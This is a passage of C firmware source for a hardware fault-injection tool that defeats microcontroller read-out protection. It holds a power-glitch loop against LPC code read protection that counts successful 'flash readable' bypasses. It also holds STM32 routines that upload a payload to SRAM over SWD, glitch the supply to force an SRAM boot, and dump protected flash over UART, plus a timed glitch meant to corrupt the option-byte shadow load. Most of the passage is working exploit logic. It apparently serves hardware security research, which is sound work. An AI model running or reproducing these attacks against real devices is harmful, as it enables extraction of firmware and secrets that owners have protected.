        for (size_t i = 0; i + 1 < pos; i++) {
            if (buf[i] == '\n') { rc_line = &buf[i + 1]; break; }
        }
        if (rc_line) {
            while (*rc_line == '\r' || *rc_line == ' ') rc_line++;
            if (*rc_line >= '0' && *rc_line <= '9') {
                int rc = atoi(rc_line);
                if (rc == 19) {
                    result = "normal";
                    normal_cnt++;
                } else if (rc == 0) {
                    result = "bypass";
                    bypass++;
                } else {
                    result = "effect";
                    effect_cnt++;
                }
            } else {
                effect_cnt++;
            }
        } else if (!saw_lf) {
            // Nothing came back at all
            effect_cnt++;
        } else {
            effect_cnt++;
        }

        uart_cli_printf("[LPC GLITCH] attempt=%lu vmin=%.2fV bor=%s dur=%luus isp=%s\r\n",
                        iter + 1, vmin_v,
                        gr.nrst_went_low ? "Y" : "N",
                        gr.glitch_us, result);

        // Full power cycle between shots so each attempt boots from a clean
        // POR. Without this, the chip's state from a partial glitch carries
        // forward — manifests as runs of consecutive sync_fails where the
        // earlier shot got the chip stuck and subsequent shots can't recover.
        // 100 ms off drains the rail past any internal POR threshold; 50 ms
        // on lets the bootROM start ISP again before we re-sync.
        gpio_clr_mask(POWER_MASK);
        sleep_ms(100);
        gpio_set_mask(POWER_MASK);
        sleep_ms(50);
    }

    uart_cli_printf("\r\n=== LPC CRP-bypass summary (target=%.2fV) ===\r\n", voltage);
    uart_cli_printf("  bypass:    %lu  *** flash readable ***\r\n", bypass);
    uart_cli_printf("  normal:    %lu  (rc=19, CRP held)\r\n", normal_cnt);
    uart_cli_printf("  effect:    %lu  (perturbed, no clean rc)\r\n", effect_cnt);
    uart_cli_printf("  sync_fail: %lu  (could not re-enter ISP)\r\n", sync_fail);

    // Restore power for next user activity
    gpio_set_mask(POWER_MASK);
    // Reset pin back to high-Z inactive — target's pull on nRST owns the
    // line so we don't leak onto JTAG TREF or other shared nets.
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_disable_pulls(reset_pin);
}

// Upload payload to SRAM, set BOOT0/BOOT1 for SRAM boot, power glitch to reset
void target_power_payload(float voltage, uint32_t max_attempts) {
    if (power_group_glitch_blocked()) return;
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;

    // Payload size in 32-bit words (round up)
    uint32_t payload_words = (sizeof(f103_led_payload) + 3) / 4;

    uart_cli_printf("SRAM payload: %u bytes (%lu words) -> 0x%08lX\r\n",
                    (unsigned)sizeof(f103_led_payload), payload_words, sram_base);

    // Step 1: Upload payload to SRAM via SWD
    uart_cli_send("[1] Uploading payload to SRAM...\r\n");
    swd_init();
    if (!swd_connect()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect failed\r\n");
        return;
    }
    swd_halt();

    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)f103_led_payload, payload_words);
    if (written != payload_words) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
        swd_deinit();
        return;
    }

    // Verify write
    uint32_t readback[payload_words];
    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
    if (nread != payload_words || memcmp(readback, f103_led_payload, sizeof(f103_led_payload)) != 0) {
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    // Resume core before floating SWD — C_HALT persists through system reset
    // so nRST alone won't unhalt. Must clear it via SWD first.
    swd_resume();
    swd_deinit();

    // Step 2: Set BOOT0=1, BOOT1=1 for SRAM boot mode
    // Drive GPIOs directly
    #define BOOT0_PIN PIN_BOOT0
    #define BOOT1_PIN PIN_BOOT1
    uart_cli_send("[2] Setting BOOT0=HIGH, BOOT1=HIGH (SRAM boot mode)\r\n");
    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, 1);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 1);

    // Step 3: Power glitch to trigger POR — boots from SRAM with BOOT0=1, BOOT1=1
    // Use sweep calibration if available, otherwise use provided/default values
    float thresh_v = voltage;
    if (sweep_calibrated) {
        thresh_v = sweep_optimal_thresh;
        uart_cli_printf("[3] Power glitch (sweep calibrated: %.2fV, max %lu attempts)...\r\n",
                        thresh_v, max_attempts);
    } else {
        uart_cli_printf("[3] Power glitch (default: %.2fV, max %lu attempts)...\r\n",
                        thresh_v, max_attempts);
        uart_cli_send("    (Run TARGET GLITCH SWEEP first for auto-calibration)\r\n");
    }

    // Ensure power pins are fully HIGH before glitching
    gpio_set_mask(POWER_MASK);
    sleep_ms(50);

    // Configure nRST as input with pull-up so we can detect BOR
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    adc_power_init();
    uint32_t thresh = (uint32_t)(thresh_v / 3.3f * 4095.0f);

    bool success = false;
    uint16_t adc_log[256];
    uint32_t adc_log_count = 0;
    glitch_result_t gr;

    for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
        // Custom glitch: ADC-controlled discharge + hold for debug POR latch
        nrst_irq_arm();

        gpio_set_dir(POWER_PIN2, GPIO_IN);
        gpio_set_dir(POWER_PIN3, GPIO_IN);
        gpio_disable_pulls(POWER_PIN2);
        gpio_disable_pulls(POWER_PIN3);

        adc_select_input(ADC_POWER_CHAN);
        gr.vmin_raw = 4095;
        gr.nrst_went_low = false;
        gr.thresh_reached = true;

        uint64_t t0 = time_us_64();
        gpio_clr_mask(1u << POWER_PIN1);

        // ADC-controlled discharge to sweep-calibrated threshold
        while (true) {
            uint16_t val = adc_read();
            if (val < gr.vmin_raw) gr.vmin_raw = val;
            if (val <= thresh) break;
            if (time_us_64() - t0 > 500000) { gr.thresh_reached = false; break; }
        }

        // Hold for debug domain POR latch (~50us)
        if (gr.thresh_reached) {
            sleep_us(50);
            uint16_t val = adc_read();
            if (val < gr.vmin_raw) gr.vmin_raw = val;
        }

        // Restore power
        gpio_set_dir(POWER_PIN2, GPIO_OUT);
        gpio_set_dir(POWER_PIN3, GPIO_OUT);
        gpio_set_mask(POWER_MASK);
        gr.glitch_us = (uint32_t)(time_us_64() - t0);

        // Monitor nRST for 50ms
        for (int i = 0; i < 5000; i++) {
            if (!gpio_get(reset_pin)) { gr.nrst_went_low = true; break; }
            sleep_us(10);
        }
        nrst_irq_disarm();
        if (!gr.nrst_went_low && nrst_irq_fired) gr.nrst_went_low = true;

        float vmin = gr.vmin_raw * 3.3f / 4095.0f;
        uart_cli_printf("  [%lu] Vmin=%.2fV glitch=%luus nRST=%s\r\n",
                        attempt, vmin, gr.glitch_us,
                        gr.nrst_went_low ? "LOW" : "high");

        if (gr.nrst_went_low) {
            uart_cli_send("    BOR + POR latch — target should boot from SRAM\r\n");
            success = true;
            break;
        }

        // Re-stabilize power between attempts
        gpio_set_mask(POWER_MASK);
        sleep_ms(200);
    }

    // Ensure power is back on
    gpio_set_mask(POWER_MASK);

    if (success) {
        uart_cli_send("\r\nSUCCESS: Glitch triggered BOR with SRAM intact\r\n");
        uart_cli_send("BOOT0=HIGH, BOOT1=HIGH — target running from SRAM\r\n");
    } else {
        uart_cli_send("\r\nFAILED: Could not trigger BOR with intact SRAM\r\n");
        uart_cli_send("Try a higher voltage threshold to preserve SRAM\r\n");
        // Restore boot pins
        gpio_put(BOOT0_PIN, 0);
        gpio_put(BOOT1_PIN, 0);
    }
}

// ---------------------------------------------------------------------------
// Per-family BYPASS payload selection. The payload is self-contained (stage 1
// configures the FPB after the POR glitch SRAM-boots it), so the host only needs
// the payload bytes + SRAM load base. Each family has its own peripheral map
// (and F4 adds the FPB reader trick that F1 doesn't need).
typedef struct {
    const uint8_t *payload;
    uint32_t       size;
    uint32_t       load_base;  // SWD upload address == the payload's link base
} rdp_bypass_payload_t;

extern target_type_t target_get_type(void);

static const rdp_bypass_payload_t *get_rdp_bypass_payload(target_type_t type) {
    static const rdp_bypass_payload_t f1_bp = {
        .payload   = f103_rdp_bypass_payload,
        .size      = sizeof(f103_rdp_bypass_payload),
        .load_base = 0x20000000,
    };
    static const rdp_bypass_payload_t f4_bp = {
        .payload   = f4_rdp_bypass_payload,
        .size      = sizeof(f4_rdp_bypass_payload),
        .load_base = 0x20000000,   // SRAM-boot alias base; see f4/rdp_bypass.S
    };
    switch (type) {
        case TARGET_STM32F1: return &f1_bp;
        case TARGET_STM32F4: return &f4_bp;
        default:             return NULL;  // F2/F3 not ported yet
    }
}

void target_power_bypass(uint32_t max_attempts, uint32_t dump_bytes, uint32_t glitch_mv) {
    if (power_group_glitch_blocked()) return;
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern bool swd_resume(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    // Select the per-family BYPASS payload up front so an unported family fails
    // loudly instead of running a sweep / glitch with the wrong payload.
    const rdp_bypass_payload_t *bp = get_rdp_bypass_payload(target_get_type());
    if (!bp) {
        uart_cli_printf("ERROR: No BYPASS payload for %s — only STM32F1 and STM32F4 are ported\r\n",
                        info->name);
        return;
    }

    if (glitch_mv > 0) {
        // Explicit voltage supplied — use it directly and skip the sweep, so a
        // known-good depth (from a prior TARGET GLITCH SWEEP) can be re-applied
        // without re-sweeping every run.
        sweep_optimal_thresh = (float)glitch_mv / 1000.0f;
        sweep_calibrated = true;
        uart_cli_printf("Using supplied glitch voltage: %.2fV (%lu mV) — skipping sweep\r\n",
                        sweep_optimal_thresh, (unsigned long)glitch_mv);
    } else if (!sweep_calibrated) {
        uart_cli_send("No sweep calibration — running SWEEP first...\r\n\r\n");
        target_power_sweep();
        if (!sweep_calibrated) {
            uart_cli_send("ERROR: Sweep failed to find optimal threshold\r\n");
            return;
        }
        uart_cli_send("\r\nSweep complete, continuing with BYPASS...\r\n\r\n");
    }

    uint32_t sram_base = bp->load_base;
    uint32_t payload_words = (bp->size + 3) / 4;

    // Default to full flash if no count specified
    if (dump_bytes == 0)
        dump_bytes = info->flash_size;
    // Round up to word boundary
    dump_bytes = (dump_bytes + 3) & ~3u;

    uart_cli_printf("RDP1 bypass: %s, %lu byte payload -> 0x%08lX, dumping %lu bytes\r\n",
                    info->name, bp->size, sram_base, dump_bytes);
    uart_cli_printf("Sweep calibrated threshold: %.2fV\r\n", sweep_optimal_thresh);

    // === Step 1: Upload bypass payload to SRAM via SWD ===
    uart_cli_send("\r\n[1] Uploading bypass payload to SRAM...\r\n");
    swd_init();
    if (!swd_connect()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect failed\r\n");
        return;
    }
    swd_halt();

    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)bp->payload, payload_words);
    if (written != payload_words) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
        swd_deinit();
        return;
    }

    // Verify write
    uint32_t readback[payload_words];
    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
    if (nread != payload_words || memcmp(readback, bp->payload, bp->size) != 0) {
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    swd_resume();
    swd_deinit();

    // === Step 2: Set BOOT0=1, BOOT1=1 for SRAM boot mode ===
    uart_cli_send("[2] Setting BOOT0=HIGH, BOOT1=HIGH (SRAM boot mode)\r\n");
    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, 1);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 1);

    // === Step 3: Power glitch to trigger POR — stage 1 runs from SRAM ===
    float thresh_v = sweep_optimal_thresh;
    uart_cli_printf("[3] Power glitch for POR (threshold: %.2fV, max %lu attempts)...\r\n",
                    thresh_v, max_attempts);

    gpio_set_mask(POWER_MASK);
    sleep_ms(50);

    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    adc_power_init();
    uint32_t thresh = (uint32_t)(thresh_v / 3.3f * 4095.0f);

    bool stage1_ok = false;
    glitch_result_t gr;

    for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
        nrst_irq_arm();

        gpio_set_dir(POWER_PIN2, GPIO_IN);
        gpio_set_dir(POWER_PIN3, GPIO_IN);
        gpio_disable_pulls(POWER_PIN2);
        gpio_disable_pulls(POWER_PIN3);

        adc_select_input(ADC_POWER_CHAN);
        gr.vmin_raw = 4095;
        gr.nrst_went_low = false;
        gr.thresh_reached = true;

        uint64_t t0 = time_us_64();
        gpio_clr_mask(1u << POWER_PIN1);

        while (true) {
            uint16_t val = adc_read();
            if (val < gr.vmin_raw) gr.vmin_raw = val;
            if (val <= thresh) break;
            if (time_us_64() - t0 > 500000) { gr.thresh_reached = false; break; }
        }

        if (gr.thresh_reached) {
            sleep_us(50);
            uint16_t val = adc_read();
            if (val < gr.vmin_raw) gr.vmin_raw = val;
        }

        gpio_set_dir(POWER_PIN2, GPIO_OUT);
        gpio_set_dir(POWER_PIN3, GPIO_OUT);
        gpio_set_mask(POWER_MASK);
        gr.glitch_us = (uint32_t)(time_us_64() - t0);

        for (int i = 0; i < 5000; i++) {
            if (!gpio_get(reset_pin)) { gr.nrst_went_low = true; break; }
            sleep_us(10);
        }
        nrst_irq_disarm();
        if (!gr.nrst_went_low && nrst_irq_fired) gr.nrst_went_low = true;

        float vmin = gr.vmin_raw * 3.3f / 4095.0f;
        uart_cli_printf("  [%lu] Vmin=%.2fV glitch=%luus nRST=%s\r\n",
                        attempt, vmin, gr.glitch_us,
                        gr.nrst_went_low ? "LOW" : "high");

        if (gr.nrst_went_low) {
            uart_cli_send("    POR triggered — stage 1 configuring FPB...\r\n");
            stage1_ok = true;
            break;
        }

        gpio_set_mask(POWER_MASK);
        sleep_ms(200);
    }

    gpio_set_mask(POWER_MASK);

    if (!stage1_ok) {
        uart_cli_send("\r\nFAILED: Could not trigger POR for stage 1\r\n");
        gpio_put(BOOT0_PIN, 0);
        gpio_put(BOOT1_PIN, 0);
        return;
    }

    // Wait for stage 1 to finish configuring FPB (LED goes solid)
    uart_cli_send("    Waiting for stage 1 to complete...\r\n");
    sleep_ms(500);

    // === Step 4: Init target UART for receiving dump ===
    uart_cli_send("[4] Initializing UART RX (GP5, 115200, 8N1)...\r\n");

    // Init UART1 for RX at 115200 baud (matches payload USART1 config)
    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_RX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);

    // === Step 5: Set BOOT0=0, pulse nRST — stage 2 sends flash via UART ===
    // Matches Joe Grand's stm32-fault-injection notebook (cell 30): BOOT0=LOW,
    // BOOT1 stays HIGH, nRST held LOW ~50ms, then DRIVEN high (not released to a
    // pull-up), ~100ms settle before reading.
    uart_cli_send("[5] Setting BOOT0=LOW (flash boot), pulsing nRST (JG timing)...\r\n");
    uart_cli_send("[6] Receiving flash dump via UART...\r\n");
    gpio_put(BOOT0_PIN, 0);
    /* BOOT1 left HIGH (matches JG tio3=True; BOOT0=0 makes flash-boot anyway) */
    sleep_ms(10);

    // Drain FIFO before reset
    while (uart_is_readable(TARGET_UART_ID))
        uart_getc(TARGET_UART_ID);

    // Pulse nRST — system reset preserves FPB. Match JG: 50ms low, drive high.
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_put(reset_pin, 0);
    sleep_ms(50);
    gpio_put(reset_pin, 1);       // drive HIGH (do not release to pull-up)
    sleep_ms(100);                // settle before reading, like JG's time.sleep(0.1)

    // Helper: receive exactly n bytes with timeout, returns bytes received
    #define BYPASS_TIMEOUT_US 5000000  // 5 second total timeout
    #define BYPASS_BYTE_TIMEOUT_US 500000  // 500ms idle = give up

    // --- Wait for "RDP1" header (scan byte-by-byte) ---
    uint8_t hdr_state = 0;  // matching "RDP1" character by character
    const char *hdr_str = "RDP1";
    uint64_t rx_start = time_us_64();
    uint64_t last_byte_time = rx_start;
    bool hdr_found = false;

    while (!hdr_found) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t c = uart_getc(TARGET_UART_ID);
            last_byte_time = time_us_64();
            if (c == hdr_str[hdr_state]) {
                hdr_state++;
                if (hdr_state == 4) hdr_found = true;
            } else {
                hdr_state = (c == 'R') ? 1 : 0;
            }
        } else {
            if (time_us_64() - rx_start > BYPASS_TIMEOUT_US) break;
            if (hdr_state > 0 && (time_us_64() - last_byte_time > BYPASS_BYTE_TIMEOUT_US)) break;
        }
    }

    if (!hdr_found) {
        uart_cli_send("ERROR: \"RDP1\" header not received — stage 2 may not be executing\r\n");
        goto bypass_cleanup;
    }
    uart_cli_send("    Header: RDP1\r\n");

    // --- Receive CPUID (4 bytes) ---
    uint8_t cpuid_buf[4];
    for (int i = 0; i < 4; i++) {
        uint64_t t0 = time_us_64();
        while (!uart_is_readable(TARGET_UART_ID)) {
            if (time_us_64() - t0 > BYPASS_BYTE_TIMEOUT_US) {
                uart_cli_send("ERROR: Timeout reading CPUID\r\n");
                goto bypass_cleanup;
            }
        }
        cpuid_buf[i] = uart_getc(TARGET_UART_ID);
    }
    uint32_t cpuid = cpuid_buf[0] | (cpuid_buf[1] << 8) |
                    (cpuid_buf[2] << 16) | (cpuid_buf[3] << 24);
    uint8_t implementer = (cpuid >> 24) & 0xFF;
    uint16_t partno = (cpuid >> 4) & 0xFFF;
    uart_cli_printf("    CPUID: 0x%08lX", cpuid);
    if (implementer == 0x41 && partno == 0xC23)
        uart_cli_printf(" (Cortex-M3 r%lup%lu)\r\n", (cpuid >> 20) & 0xF, cpuid & 0xF);
    else if (implementer == 0x41 && partno == 0xC24)
        uart_cli_send(" (Cortex-M4)\r\n");
    else
        uart_cli_send("\r\n");

    // --- Stream flash data, printing as we receive ---
    uart_cli_send("\r\n=== RDP1 BYPASS — FLASH DUMP ===\r\n");
    uart_cli_printf("Dumping %lu bytes from 0x08000000:\r\n", dump_bytes);

    uint32_t rx_total = 0;
    uint8_t line_buf[16];
    uint32_t line_pos = 0;

    while (rx_total < dump_bytes) {
        uint64_t t0 = time_us_64();
        while (!uart_is_readable(TARGET_UART_ID)) {
            if (time_us_64() - t0 > BYPASS_BYTE_TIMEOUT_US) {
                // Flush partial line
                if (line_pos > 0) {
                    uint32_t line_addr = 0x08000000 + rx_total - line_pos;
                    uart_cli_printf("0x%08lX:", line_addr);
                    for (uint32_t j = 0; j < line_pos; j++)
                        uart_cli_printf(" %02X", line_buf[j]);
                    for (uint32_t j = line_pos; j < 16; j++)
                        uart_cli_send("   ");
                    uart_cli_send("  ");
                    for (uint32_t j = 0; j < line_pos; j++) {
                        char c = line_buf[j];
                        uart_cli_printf("%c", (c >= 32 && c <= 126) ? c : '.');
                    }
                    uart_cli_send("\r\n");
                }
                uart_cli_printf("\r\nERROR: Timeout after %lu of %lu bytes\r\n", rx_total, dump_bytes);
                goto bypass_reset;
            }
        }
        line_buf[line_pos++] = uart_getc(TARGET_UART_ID);
        rx_total++;

        if (line_pos == 16 || rx_total == dump_bytes) {
            uint32_t line_addr = 0x08000000 + rx_total - line_pos;
            uart_cli_printf("0x%08lX:", line_addr);
            for (uint32_t j = 0; j < line_pos; j++)
                uart_cli_printf(" %02X", line_buf[j]);
            for (uint32_t j = line_pos; j < 16; j++)
                uart_cli_send("   ");
            uart_cli_send("  ");
            for (uint32_t j = 0; j < line_pos; j++) {
                char c = line_buf[j];
                uart_cli_printf("%c", (c >= 32 && c <= 126) ? c : '.');
            }
            uart_cli_send("\r\n");
            line_pos = 0;
        }
    }

    uart_cli_printf("\r\nDump complete: %lu bytes received\r\n", rx_total);

bypass_reset:
    // Reset the target to stop the payload streaming
    uart_cli_send("[7] Power cycling target...\r\n");
    gpio_clr_mask(POWER_MASK);
    sleep_ms(100);
    gpio_set_mask(POWER_MASK);

bypass_cleanup:
    // Restore boot pins
    gpio_put(BOOT0_PIN, 0);
    gpio_put(BOOT1_PIN, 0);
}

// STM32 RDP1 SHADOW-load glitch bypass. Same proven FPB chain as target_power_bypass
// (stage1 SRAM-boot -> configure FPB -> BOOT0=0 + nRST -> stage2 direct read), but
// step 3 attempts to CORRUPT THE RDP OPTION-BYTE SHADOW LOAD during the POR recovery
// with a precisely-timed voltage dip (Joe Grand's downgrade-glitch idea) so the chip
// comes up effectively-RDP0 for the session. Sweeps glitch offset x width. Success =
// stage2 emits "RDP1" header + real (non-0xFF) flash. Verification is debugger-free
// (the FPB/UART path) because at RDP1 an SWD flash read is blocked while debug is
// attached. NOTE: GP10/11/12 is a slow GPIO-sourced rail; this is a best-effort
// software glitch — a fast crowbar on VCAP is the "proper" tool.
void target_power_shadowbypass(uint32_t max_attempts, uint32_t dump_bytes, uint32_t glitch_mv,
                               uint32_t off_lo, uint32_t off_hi) {
    if (power_group_glitch_blocked()) return;
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern bool swd_resume(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info) return;
    const rdp_bypass_payload_t *bp = get_rdp_bypass_payload(target_get_type());
    if (!bp) { uart_cli_printf("ERROR: No BYPASS payload for %s\r\n", info->name); return; }

    uint32_t sram_base = bp->load_base;
    uint32_t payload_words = (bp->size + 3) / 4;
    if (dump_bytes == 0) dump_bytes = 64;
    if (dump_bytes > 256) dump_bytes = 256;
    dump_bytes = (dump_bytes + 3) & ~3u;
    if (max_attempts == 0) max_attempts = 2000;

    // Sweep bands (microseconds after the power-restore edge). Brief brownout =>
    // fast recovery, so the shadow-load window is us-scale. Tunable. Optional
    // off_lo/off_hi focus-window (from SHADOWTRACE localization, e.g. 1300..1500us)
    // overrides the default full sweep; 0/0 = default 5..1500us.
    uint32_t OFF_MIN = 5, OFF_MAX = 1500;
    const uint32_t OFF_STEP = 5;
    if (off_lo || off_hi) {
        if (off_hi < off_lo) { uint32_t t = off_lo; off_lo = off_hi; off_hi = t; }
        OFF_MIN = off_lo ? off_lo : 5;
        OFF_MAX = off_hi ? off_hi : OFF_MIN + 5;
    }
    const uint32_t WIDTHS[] = {5, 10, 20, 40};
    const int NW = (int)(sizeof(WIDTHS) / sizeof(WIDTHS[0]));

    // Optional calibrated dip depth. glitch_mv>0 => the recovery dip is ADC-gated
    // to that voltage (drop rail, poll ADC0/GP26 until <= thresh, then dwell WIDTH)
    // instead of the legacy uncontrolled fixed-time low pull. Establish the value
    // with TARGET GLITCH SWEEP (its optimal threshold), then pass it here.
    uint16_t glitch_thresh = glitch_mv ? (uint16_t)((uint32_t)glitch_mv * 4095u / 3300u) : 0;

    uart_cli_printf("RDP1 SHADOW-glitch bypass: %s, offset %lu..%luus/step%lu, widths 5/10/20/40us, up to %lu attempts\r\n",
                    info->name, OFF_MIN, OFF_MAX, OFF_STEP, max_attempts);
    if (glitch_thresh)
        uart_cli_printf("Dip depth: ADC-gated to %.2fV (%lu mV, thresh=%u)\r\n",
                        (float)glitch_mv / 1000.0f, (unsigned long)glitch_mv, glitch_thresh);
    else
        uart_cli_send("Dip depth: uncontrolled fixed-time low pull (no voltage given)\r\n");
    uart_cli_send("Success = stage2 'RDP1' header + non-0xFF flash. (slow GPIO rail; best-effort)\r\n");

    // Upload payload once (SRAM is writable over SWD even at RDP1).
    swd_init();
    if (!swd_connect()) { swd_deinit(); uart_cli_send("ERROR: SWD connect failed\r\n"); return; }
    swd_halt();
    if (swd_write_mem(sram_base, (const uint32_t *)bp->payload, payload_words) != payload_words) {
        uart_cli_send("ERROR: SRAM upload failed\r\n"); swd_deinit(); return;
    }
    swd_resume();
    swd_deinit();
    uart_cli_send("Payload uploaded to SRAM.\r\n");

    gpio_init(BOOT0_PIN); gpio_set_dir(BOOT0_PIN, GPIO_OUT); gpio_put(BOOT0_PIN, 1);
    gpio_init(BOOT1_PIN); gpio_set_dir(BOOT1_PIN, GPIO_OUT); gpio_put(BOOT1_PIN, 1);
    gpio_set_dir(POWER_PIN1, GPIO_OUT); gpio_set_dir(POWER_PIN2, GPIO_OUT); gpio_set_dir(POWER_PIN3, GPIO_OUT);
    gpio_set_mask(POWER_MASK);
    sleep_ms(50);
    adc_power_init();

    // UART RX ready on GP5 @115200 8N1.
    uart_deinit(TARGET_UART_ID);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);

    uint32_t attempt = 0, effects = 0, reuploads = 0;
    uint32_t off = OFF_MIN; int wi = 0;
    bool success = false;

    while (attempt < max_attempts && !success) {
        attempt++;
        uint32_t width = WIDTHS[wi];

        // --- Step 3 (user fix 2026-10-06): a BROWNOUT does NOT reload the
        //     option-byte shadow — only a full PoR does — so the old brownout had
        //     nothing to glitch. Do a FULL power-down (VDD->~0) each iteration to
        //     force a fresh shadow load, with a timed dip during the recovery to
        //     corrupt it. A full PoR wipes SRAM, so the FPB payload is re-uploaded
        //     every iteration AFTER the glitch; the subsequent nRST launches
        //     PRESERVE the glitched RDP latch (nRST/BoR does not reload it). ---
        gpio_put(BOOT0_PIN, 0);   // flash-boot during the glitched PoR (don't run wiped SRAM)
        gpio_set_dir(POWER_PIN1, GPIO_OUT); gpio_set_dir(POWER_PIN2, GPIO_OUT); gpio_set_dir(POWER_PIN3, GPIO_OUT);
        adc_select_input(ADC_POWER_CHAN);
        gpio_clr_mask(POWER_MASK);   // FULL power off (all 3 pins low)
        uint64_t tb = time_us_64();
        while (adc_read() > 120 /* ~0.1V: full discharge so the shadow actually reloads */) {
            if (time_us_64() - tb > 300000) break;
        }
        // Restore rail => shadow-load recovery begins (t0).
        gpio_set_mask(POWER_MASK);
        uint64_t t0 = time_us_64();
        while ((uint32_t)(time_us_64() - t0) < off) tight_loop_contents();
        // Glitch dip: ADC-gated to the calibrated depth if a voltage was given,
        // else a fixed-time low pull for `width` us.
        gpio_clr_mask(POWER_MASK);
        uint64_t td = time_us_64();
        if (glitch_thresh) {
            adc_select_input(ADC_POWER_CHAN);
            while (adc_read() > glitch_thresh) {
                if ((uint32_t)(time_us_64() - td) > 2000) break;  // 2ms safety cap
            }
            uint64_t tw = time_us_64();
            while ((uint32_t)(time_us_64() - tw) < width) tight_loop_contents();
        } else {
            while ((uint32_t)(time_us_64() - td) < width) tight_loop_contents();
        }
        gpio_set_mask(POWER_MASK);   // rail restored; glitched shadow now latched for this boot
        sleep_ms(2);

        // Re-upload payload each iteration (the full PoR wiped SRAM). SWD access
        // does not reset the core, so the glitched RDP latch persists.
        gpio_put(BOOT0_PIN, 0);
        swd_init();
        if (swd_connect()) {
            swd_halt();
            swd_write_mem(sram_base, (const uint32_t *)bp->payload, payload_words);
            swd_resume();
            reuploads++;
        }
        swd_deinit();

        // Boot stage1 from SRAM: BOOT0=1 + nRST (nRST preserves the glitched latch).
        gpio_put(BOOT0_PIN, 1); gpio_put(BOOT1_PIN, 1);
        gpio_init(reset_pin); gpio_set_dir(reset_pin, GPIO_OUT);
        gpio_put(reset_pin, 0); sleep_ms(20); gpio_put(reset_pin, 1);

        // Let stage1 boot from SRAM and configure the FPB.
        sleep_ms(80);

        // --- Launch stage2: BOOT0=0 + nRST pulse (system reset preserves FPB &
        //     the glitched RDP shadow) ---
        gpio_put(BOOT0_PIN, 0);
        while (uart_is_readable(TARGET_UART_ID)) uart_getc(TARGET_UART_ID);
        gpio_init(reset_pin); gpio_set_dir(reset_pin, GPIO_OUT);
        gpio_put(reset_pin, 0); sleep_ms(20);
        gpio_put(reset_pin, 1); sleep_ms(30);

        // --- Capture: wait briefly for the "RDP1" header ---
        uint8_t hs = 0; bool hdr = false; uint64_t rs = time_us_64();
        while ((uint32_t)(time_us_64() - rs) < 250000) {
            if (uart_is_readable(TARGET_UART_ID)) {
                uint8_t c = uart_getc(TARGET_UART_ID);
                const char *H = "RDP1";
                if (c == H[hs]) { hs++; if (hs == 4) { hdr = true; break; } }
                else hs = (c == 'R') ? 1 : 0;
            }
        }

        if (hdr) {
            effects++;
            uint8_t cid[4]; bool ok = true;
            for (int i = 0; i < 4 && ok; i++) {
                uint64_t t = time_us_64();
                while (!uart_is_readable(TARGET_UART_ID)) {
                    if (time_us_64() - t > 150000) { ok = false; break; }
                }
                if (ok) cid[i] = uart_getc(TARGET_UART_ID);
            }
            uint8_t db[256]; uint32_t got = 0, nonff = 0;
            while (got < dump_bytes) {
                uint64_t t = time_us_64(); bool r = false;
                while ((uint32_t)(time_us_64() - t) < 150000) {
                    if (uart_is_readable(TARGET_UART_ID)) { r = true; break; }
                }
                if (!r) break;
                uint8_t b = uart_getc(TARGET_UART_ID);
                db[got++] = b;
                if (b != 0xFF) nonff++;
            }
            uart_cli_printf("\r\n*** [%lu] HEADER off=%luus w=%luus CPUID=%02X%02X%02X%02X got=%lu nonFF=%lu ***\r\n",
